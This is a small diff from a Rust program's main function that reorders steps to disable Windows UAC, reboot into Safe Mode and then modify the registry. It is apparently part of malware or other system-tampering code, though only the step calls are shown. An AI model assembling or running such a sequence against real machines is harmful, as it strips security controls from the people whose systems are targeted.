@@ -379,14 +379,14 @@ fn main() {
         return;
     }
 
-    // Step 8: Reboot the system to Safe Mode if needed
-    if let Err(e) = reboot_system() {
-        eprintln!("Error rebooting system: {}", e);
-    }
-
-    // Step 9: Disable UAC
+    // Step 8: Disable UAC
     if let Err(e) = disable_uac() {
         eprintln!("Error disabling UAC: {}", e);
+    }
+
+    // Step 9: Reboot the system to Safe Mode
+    if let Err(e) = reboot_system() {
+        eprintln!("Error rebooting system: {}", e);
     }
 
     // Step 10: Modify Registry
